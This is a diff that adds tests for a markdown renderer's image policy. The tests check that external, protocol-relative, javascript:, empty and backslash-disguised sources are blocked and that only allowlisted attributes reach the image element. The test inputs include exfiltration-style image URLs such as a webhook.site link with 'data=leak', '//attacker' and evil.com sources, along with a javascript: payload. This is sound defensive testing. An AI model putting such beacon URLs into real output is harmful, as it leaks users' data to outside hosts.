@@ -98,4 +98,104 @@ describe('renderMarkdown', () => {
       expect(bodyRows[1].querySelector('td')?.textContent).toBe('3');
     });
   });
+
+  describe('image sources', () => {
+    it('does not render an <img> for an external http(s) source', () => {
+      const { container } = render(
+        renderMarkdown('![audit](https://webhook.site/x?data=leak)'),
+      );
+
+      expect(container.querySelector('img')).toBeNull();
+      expect(container.textContent).toContain('external image blocked');
+    });
+
+    it('blocks protocol-relative and javascript: sources', () => {
+      for (const src of ['//attacker/p.png', 'javascript:alert(1)']) {
+        const { container } = render(renderMarkdown(`![x](${src})`));
+        expect(container.querySelector('img')).toBeNull();
+      }
+    });
+
+    it('renders an inline data:image raster', () => {
+      const { container } = render(
+        renderMarkdown('![ok](data:image/png;base64,AAAA)'),
+      );
+
+      const img = container.querySelector('img');
+      expect(img).not.toBeNull();
+      expect(img?.getAttribute('src')).toBe('data:image/png;base64,AAAA');
+    });
+
+    it('renders a same-origin relative image', () => {
+      const { container } = render(renderMarkdown('![ok](/local/chart.png)'));
+
+      expect(container.querySelector('img')?.getAttribute('src')).toBe(
+        '/local/chart.png',
+      );
+    });
+
+    // Only reachable because imageAwareUrlTransform re-admits blob:; the default
+    // transform blanks it. Pinned so a react-markdown upgrade cannot quietly drop it.
+    it('renders a local blob: image', () => {
+      const { container } = render(
+        renderMarkdown('![ok](blob:http://localhost/abc-123)'),
+      );
+
+      expect(container.querySelector('img')?.getAttribute('src')).toBe(
+        'blob:http://localhost/abc-123',
+      );
+    });
+
+    it('blocks an empty source', () => {
+      const { container } = render(renderMarkdown('![x]()'));
+
+      expect(container.querySelector('img')).toBeNull();
+      expect(container.textContent).toContain('external image blocked');
+    });
+
+    // The src policy only covers the src. srcSet and style can carry an external
+    // reference of their own, and React emits a <link rel="preload"> for srcSet, so
+    // that fetch fires before the element mounts. The renderer therefore forwards a
+    // fixed set of attributes; this pins that list so reintroducing a spread fails.
+    it('forwards only the allowed attributes to an allowed image', () => {
+      const allowed = new Set([
+        'src',
+        'alt',
+        'title',
+        'width',
+        'height',
+        'class',
+      ]);
+      const { container } = render(
+        renderMarkdown('![ok](/local/chart.png "a title")'),
+      );
+      const img = container.querySelector('img');
+
+      expect(img).not.toBeNull();
+      expect(img?.getAttribute('title')).toBe('a title');
+
+      const forwarded = Array.from(img?.attributes ?? []).map(
+        attr => attr.name,
+      );
+      expect(forwarded.filter(name => !allowed.has(name))).toEqual([]);
+    });
+
+    // Browsers fold \ to / when parsing an http(s) URL, so a backslash source
+    // would beacon externally if it reached the DOM raw. It cannot: mdast-to-hast
+    // percent-encodes it to %5C before the src policy runs, and %5C is an ordinary
+    // path character that never re-parses into an authority. These pin that, so the
+    // guarantee fails loudly if the markdown pipeline stops normalizing.
+    it('keeps backslash image sources on the current origin', () => {
+      for (const src of ['/\\evil.com/p.png', '\\\\evil.com/p.png']) {
+        const { container } = render(renderMarkdown(`![x](${src})`));
+        const rendered = container.querySelector('img')?.getAttribute('src');
+
+        expect(rendered).not.toBeUndefined();
+        expect(rendered).not.toContain('\\');
+        expect(new URL(rendered as string, 'https://dash/app/').origin).toBe(
+          'https://dash',
+        );
+      }
+    });
+  });
 });
